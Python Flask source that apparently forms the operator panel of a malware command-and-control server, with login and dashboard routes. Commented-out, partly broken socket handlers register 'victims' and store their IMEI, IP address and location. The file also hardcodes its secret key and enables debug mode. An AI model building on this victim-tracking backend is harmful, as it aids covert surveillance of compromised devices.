import re
from flask import Flask, jsonify, render_template, url_for, request, redirect, session
from flask_socketio import SocketIO, emit
from passlib.hash import pbkdf2_sha256
import sqlite3

# below dashboard pass data from nav link ro confirm original request
app = Flask(__name__)
app.secret_key = 'the rastafarian in you'
socketio = SocketIO(app)

# @socketio.on
# def connect():
#     try:
#         con = sqlite3.connect("database.db")
#         cur = con.cursor()
#         cur.execute("SELECT * FROM victim WHERE client-id= ?", (id,))
#         record = cur.fetchall()
#         con.close()
#         # emit to c&c id
#         if record.__len__() != 0:
#             emit("victims", record)
#         else:
#             emit("victims", None)
#     except sqlite3.Error as error:
#         # do something


# @socketio.on("fetch_victim")
# def fetch_victim_details(id):
#     try:
#         con = sqlite3.connect("database.db")
#         cur = con.cursor()
#         cur.execute("SELECT * FROM victim WHERE client-id= ?", (id,))
#         record = cur.fetchall()
#         con.close()
#         emit("add_victim", record)
#     except sqlite3.Error as error:
#         # do something


# @socketio.on("victim_connect")
# def victim_connect(details):
#     try:
#         con = sqlite3.connect("database.db")
#         cur = con.cursor()
#         cur.execute(
#             "INSERT INTO victim(device-id, client-id, ip-address, imei, os, network, location) VALUES(?, ?, ?, ?, ?, ?, ?)",
#             (
#                 details['device-id'],
#                 details['client-id'],
#                 details['ip-address'],
#                 details['imei'],
#                 details['os'],
#                 details['network'],
#                 details['location'],
#             )
#         )
#         con.commit()
#         con.close()
#         # emit to c&c
#         emit("new_device", "device id")
#     except sqlite3.Error as error:
#         # do something

# @socketio.on("pong")
# def reply(msg):
#     print(msg)

# def get_ccid():
#     ccid = ""
#     with open("ccid.txt", "r") as id:
#         ccid = id.read()
#     return ccid

# @socketio.on("connect")
# def connection_established(ccid):
#     with open("ccid.txt", "w+") as id_manager:
#         id_manager.write(ccid)
#     socketio.emit("connection_status", "connected")




@app.route("/", methods=['GET'])
def index():
    if 'username' not in session:
        return redirect("/login", code=302)
    else:
        return render_template("index.html"), 200


@app.route("/login", methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        if 'username' in session:
            return redirect("/", code=302)
        else:
            return render_template("login.html"), 200
    elif request.method == 'POST' and request.form.get('username') is not None and request.form.get('password') is not None:
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            con = sqlite3.connect("database.db")
            cur = con.cursor()
            cur.execute("SELECT * FROM user WHERE username= ?", (username,))
            record = cur.fetchall()
            con.close()
            if record.__len__() != 0 and username == record[0][0]:
                if pbkdf2_sha256.verify(password, record[0][1]):
                    session['username'] = username
                    return redirect("/", code=302)
                else:
                    return render_template("login.html", error="Login Failed. Incorrect username/password"), 401    
            else:
                return render_template("login.html", error="Login Failed. Incorrect username/password"), 401
        except sqlite3.Error as error:
            return render_template("login.html", error="Oops something went wrong"), 401
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@app.route("/logout", methods=['GET'])
def logout():
    if request.method == 'GET':
        if 'username' in session:
            session.pop('username', None)
            return redirect("/login", code=302)
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@app.route("/dashboard", methods=['GET'])
def dashboard():
    if request.method == 'GET':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("dashboard.html")}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@app.route("/files", methods=['GET'])
def files():
    if request.method == 'GET':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("files.html")}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400


@app.route("/settings", methods=['GET'])
def settings():
    if request.method == 'GET':
        if 'username' in session:
            return jsonify({'htmlresponse': render_template("settings.html")}), 200
        else:
            return redirect("/login", code=302)
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400

@app.route("/reset", methods=['GET', 'POST'])
def reset_password():
    if request.method == 'GET' and 'username' in session:
        return render_template("reset-password.html", username=session['username']), 200
    elif request.method == 'POST' and request.form.get('username') is not None and request.form.get('password') is not None and 'username' in session:
        username = request.form.get('username')
        password = pbkdf2_sha256.hash(request.form.get('password'))
        try:
            con = sqlite3.connect("database.db")
            cur = con.cursor()
            cur.execute("SELECT * FROM user WHERE username= ?", (session['username'],))
            record = cur.fetchall()
            if record.__len__() != 0:
                cur.execute("UPDATE user SET username= ?, passkey= ? WHERE username=?", (username, password, session['username']))
                con.commit()
                con.close()
                session['username'] = username
                return redirect("/", 302)
            else:
                con.close()
                return render_template("reset-password.html", error="Oops something went wrong"), 401
        except sqlite3.Error as error:
            con.close()
            return render_template("reset-password.html", error="Oops something went wrong"), 401
    else:
        return render_template("error_page.html", code= ["400", "Bad Request"]), 400

@app.errorhandler(404)
def page_not_found(e):
    return render_template('error_page.html', code= ["404", "Not Found"]), 404



if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5001, debug=True)